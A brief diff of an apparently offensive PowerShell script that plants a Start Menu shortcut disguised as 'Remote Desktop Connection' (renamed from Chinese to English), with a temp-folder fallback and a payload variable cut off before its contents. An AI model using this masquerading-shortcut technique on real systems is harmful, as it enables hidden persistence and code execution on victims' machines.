@@ -6,7 +6,7 @@
 # -to be dropped to disk/loaded into memory
 #
 
-$shortcutName = "远程桌面连接.lnk"
+$shortcutName = "remote desktop connection.lnk"
 $shortcutOutputPath = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Accessories\"+$shortcutName
 $shortcutFallbackExecutionFolder="`$env:temp"
 $payloadContents =
